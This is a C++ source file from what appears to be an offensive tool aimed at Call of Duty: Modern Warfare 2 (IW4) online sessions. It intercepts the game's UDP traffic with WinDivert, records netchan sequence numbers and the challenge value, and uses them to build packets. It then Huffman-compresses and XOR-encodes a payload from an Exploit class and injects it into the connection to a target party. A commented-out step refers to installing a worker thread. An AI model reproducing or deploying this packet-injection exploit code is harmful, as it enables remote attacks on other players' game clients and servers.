#include "STDInclude.hpp"

#include "Network/Address.hpp"
#include "Network/Sniffer.hpp"

#include "Game/MW2/Handler.hpp"
#include "Game/MW2/Client.hpp"

#include "Game/MW2/Exploit.hpp"

#include "Extern/Huffman.hpp"

namespace Game
{
	namespace MW2
	{
		Client::Client(Handler* _handler, Network::Address _target) : handler(_handler), target(_target), id(0), ack(0), workerInstalled(false)
		{
			ZeroMemory(this->commands, sizeof(this->commands));

			this->onOOB("challengeResponse", [this](Network::Packet* /*packet*/, std::string data, bool receiving)
			{
				if (!receiving) return;
				while (!data.empty() && data.back() == 0) data.pop_back();

				this->challenge = strtoul(data.data(), nullptr, 10);
			});

			this->onOOB("statResponse", [this](Network::Packet* /*packet*/, std::string data, bool receiving)
			{
				if (!receiving) return;
				while (!data.empty() && data.back() == 0) data.pop_back();

				if (atoi(data.data()) == 0 && !this->workerInstalled)
				{
					this->workerInstalled = true;

					//printf("Installing worker thread...\n");
					//this->sendPayload(packet->sniffer, -1);
				}
			});

			this->onOOB("connect", [this](Network::Packet* /*packet*/, std::string data, bool receiving)
			{
				static std::regex infoStringRegex("([0-9a-fA-F]+) \"(.+)\"");

				if (!receiving)
				{
					std::smatch match;
					if (std::regex_search(data, match, infoStringRegex) && match.size() >= 3)
					{
						Utils::InfoString info(match[2]);
						this->qport = USHORT(atoi(info.get("qport").data()));
						this->xuid = strtoull(info.get("xuid").data(), nullptr, 16);

#ifdef DEBUG
						printf("Connecting to party at %s with xuid %llX as %s\n", this->target.toString().data(), this->xuid, info.get("name").data());
#else
						printf("Connecting to party with xuid %llX as %s\n", this->xuid, info.get("name").data());
#endif
					}
				}
			});

			this->onOOB("connectResponse", [this](Network::Packet* /*packet*/, std::string /*data*/, bool receiving)
			{
				if (receiving)
				{
					printf("Connected to server!\n");
					/*MessageBoxA(0, 0, 0, 0);
					this->send(sniffer, networkIf, "\xFF\xFF\xFF\xFF" "relay 1234567890");*/
				}
			});
		}

		Client::~Client()
		{

		}

		std::string Client::compressData(std::string data)
		{
			Huffman_InitMain();

			Utils::Memory::Allocator allocator;
			u_char* buffer = allocator.allocateArray<u_char>(0x10000 + data.size() * 2);
			int size = MSG_WriteBitsCompress(0, reinterpret_cast<const u_char*>(data.data()), buffer, data.size());

			return std::string(LPSTR(buffer), size);
		}

		void Client::sendPayload(Network::Sniffer* sniffer, int num)
		{
			Utils::Buffer buffer;

#ifdef USE_IW4X
			buffer.write<int>(-2);
#endif

			buffer.write<int>(this->id + 1);
			buffer.write<short>(this->qport); // qport

			buffer.write<char>(0);
			buffer.write<int>(0);

			//int command = this->ack & ~(MAX_RELIABLE_COMMANDS - 1);
			int command = this->ack + (MAX_RELIABLE_COMMANDS - 1);

			command &= ~(MAX_RELIABLE_COMMANDS - 1); // Resolve to slot 0
			buffer.write<int>(command); // Reliable ack

			Exploit exploit;
			std::string data = this->compressData(exploit.buildPayload(num));

			//int i = 0, index = 0;
			u_char key = u_char(this->challenge);
			//u_char* string = this->commands[command & (MAX_RELIABLE_COMMANDS - 1)]; // Unnecessary, we won't decrypt server data

			for (auto& chr : data)
			{
				/*if (!string[index]) index = 0;
				if (string[index] > 127 || string[index] == '%')
				{
					key ^= '.' << (i & 1);
				}
				else
				{
					key ^= string[index] << (i & 1);
				}

				++index, ++i;*/

				chr ^= key;
			}

			buffer.append(data);

			if (num == 7)
			{
				buffer.clear();
				buffer.write(-15);
				buffer.write(0);
			}

			this->send(sniffer, buffer);

#ifdef DEBUG
			printf("Sending bytes %s\n", Utils::String::DumpHex(buffer, " ").data());
#endif
		}

		void Client::onOOB(std::string command, Callback callback)
		{
			this->oobHandlers[Utils::String(command).toLower()] = callback;
		}

		void Client::send(Network::Sniffer* sniffer, std::string data)
		{
			if (this->packetTemplate.staticData.empty()) return;

			Utils::Buffer buffer(this->packetTemplate.staticData);
			PBYTE buf = PBYTE(buffer.data());

			PWINDIVERT_IPHDR ipHeader = PWINDIVERT_IPHDR(buf);
			u_short ipHeaderLength = ipHeader->HdrLength * 4;
			ipHeader->Length = htons(u_short(ipHeaderLength + sizeof(WINDIVERT_UDPHDR) + data.size()));

			PWINDIVERT_UDPHDR udpHeader = PWINDIVERT_UDPHDR(buf + (ipHeader->HdrLength * 4));
			udpHeader->Length = htons(u_short(data.size() + sizeof(WINDIVERT_UDPHDR)));

			IN_ADDR source, dest;
			dest.S_un.S_addr = ipHeader->DstAddr;
			source.S_un.S_addr = ipHeader->SrcAddr;

			udpHeader->Checksum = 0;

			buffer.append(data);

			Network::Packet outPacket;
			outPacket.address = this->packetTemplate.address;
			outPacket.rawData = std::string_view(buffer.data(), buffer.size());

			sniffer->send(&outPacket);
		}

		int Client::getDirection(Network::Address source, Network::Address _target)
		{
			if (source == this->target) return Client::PacketDirection::REMOTE_TO_LOCAL;
			if (_target == this->target) return Client::PacketDirection::LOCAL_TO_REMOTE;

			return Client::PacketDirection::NONE;
		}

		void Client::handle(Network::Packet* packet, bool receiving)
		{
			if (!receiving && this->packetTemplate.staticData.empty())
			{
				this->packetTemplate = *packet;
				this->packetTemplate.staticData = packet->rawData.substr(0, packet->rawData.size() - packet->data.size());
			}

			if (!this->handleOOB(packet, receiving))
			{
				this->handleNetchan(packet, receiving);
			}
		}

		bool Client::handleOOB(Network::Packet* packet, bool receiving)
		{
			if (packet->data.size() >= 4 && !std::memcmp(packet->data.data(), "\xFF\xFF\xFF\xFF", 4))
			{
				Utils::String command;
				for (auto i = packet->data.begin() + 4; i != packet->data.end(); ++i)
				{
					if (*i == '\0' || *i == '\n' || *i == ' ' || (i + 1) == packet->data.end())
					{
						command = std::string(packet->data.begin() + 4, i);
						break;
					}
				}

				std::string buffer;
				if (packet->data.size() >= command.size() + 5)
				{
					buffer = std::string(packet->data.begin() + command.size() + 5, packet->data.end());
				}

				auto callback = this->oobHandlers.find(command.toLower());
				if (callback != this->oobHandlers.end())
				{
					callback->second(packet, buffer, receiving);
				}

				return true;
			}

			return false;
		}

		void Client::handleNetchan(Network::Packet* packet, bool receiving)
		{
			if (!receiving)
			{
				if (packet->data.size() >= 4)
				{
					size_t offset = 0;
#ifdef USE_IW4X
					offset = 4;
#endif

					this->id = *PINT(packet->data.data() + offset);
					this->ack = *PINT(packet->data.data() + offset + 7);
				}
			}
		}
	}
}
